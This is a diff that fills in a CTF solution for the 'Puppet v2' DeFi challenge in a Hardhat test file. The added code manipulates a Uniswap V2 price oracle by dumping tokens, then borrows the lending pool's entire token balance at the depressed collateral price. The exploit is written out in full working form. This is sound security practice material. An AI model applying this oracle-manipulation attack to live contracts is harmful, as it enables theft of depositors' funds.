@@ -5,6 +5,30 @@ const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json")
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
+async function printBalances() {
+    let poolTokenBal = await this.token.balanceOf(this.lendingPool.address);
+    let poolWethBal = await this.weth.balanceOf(this.lendingPool.address);
+    let exchangeTokenBal = await this.token.balanceOf(this.uniswapExchange.address);
+    let exchangeWethBal = await this.weth.balanceOf(this.uniswapExchange.address);
+    let attackerTokenBal = await this.token.balanceOf(attacker.address);
+    let attackerWethBal = await this.weth.balanceOf(attacker.address);
+    
+    console.log('----------------------');
+    console.log('- poolTokenBal');
+    console.log(poolTokenBal.toString());
+    console.log('- poolWethBal');
+    console.log(poolWethBal.toString());
+    console.log('- exchangeTokenBal');
+    console.log(exchangeTokenBal.toString());
+    console.log('- exchangeWethBal');
+    console.log(exchangeWethBal.toString());
+    console.log('- attackerTokenBal');
+    console.log(attackerTokenBal.toString());
+    console.log('- attackerWethBal');
+    console.log(attackerWethBal.toString());
+    console.log('----------------------');
+}
+
 describe('[Challenge] Puppet v2', function () {
     let deployer, attacker;
 
@@ -82,6 +106,53 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        console.log('<<<<<<<<<<<<<< INIT >>>>>>>>>>>>>>>>>>');
+        console.log('pool: ', this.lendingPool.address);
+        console.log('uniswapRouter: ', this.uniswapRouter.address);
+        console.log('uniswapExchange: ', this.uniswapExchange.address);
+        console.log('attacker: ', attacker.address);
+
+        console.log('<<<<<<<<<<<<<< DUMP TOKEN AND BORROW >>>>>>>>>>>>>>>>>>');
+        const sellTokenAmtEachTime = ATTACKER_INITIAL_TOKEN_BALANCE.div(2);
+
+        for (var i=0; i<8; i++) {
+            console.log('***** i: ', i);
+
+            console.log('= approve router to move tokens');
+            await this.token.connect(attacker).approve(this.uniswapRouter.address, sellTokenAmtEachTime);
+            console.log('= swap token for weth');
+            const txn = await this.uniswapRouter.connect(attacker).swapExactTokensForTokens(sellTokenAmtEachTime, 1, [this.token.address, this.weth.address], attacker.address, (await ethers.provider.getBlock('latest')).timestamp * 2);
+            await txn.wait();
+
+            const wethRequired = await this.lendingPool.calculateDepositOfWETHRequired(sellTokenAmtEachTime);
+
+            console.log('= approve');
+            await this.weth.connect(attacker).approve(this.lendingPool.address, wethRequired);
+
+            console.log('= borrow');
+            await this.lendingPool.connect(attacker).borrow(sellTokenAmtEachTime);
+        }
+
+        console.log('<<<<<<<<<<<<<< BORROW REMAINING >>>>>>>>>>>>>>>>>>');
+        const poolTokenBal = await this.token.balanceOf(this.lendingPool.address);
+        const wethRequired = await this.lendingPool.calculateDepositOfWETHRequired(poolTokenBal);
+
+        console.log('= approve');
+        await this.weth.connect(attacker).approve(this.lendingPool.address, wethRequired);
+
+        console.log('= borrow');
+        await this.lendingPool.connect(attacker).borrow(poolTokenBal);
+
+        console.log('<<<<<<<<<<<<<< SELL ALL WETH >>>>>>>>>>>>>>>>>>');
+        const attackerWethBal = await this.weth.balanceOf(attacker.address);
+
+        console.log('= approve router to move weth');
+        await this.weth.connect(attacker).approve(this.uniswapRouter.address, attackerWethBal);
+        console.log('= swap weth for token');
+        const txn = await this.uniswapRouter.connect(attacker).swapExactTokensForTokens(attackerWethBal, 1, [this.weth.address, this.token.address], attacker.address, (await ethers.provider.getBlock('latest')).timestamp * 2);
+        await txn.wait();
+
     });
 
     after(async function () {
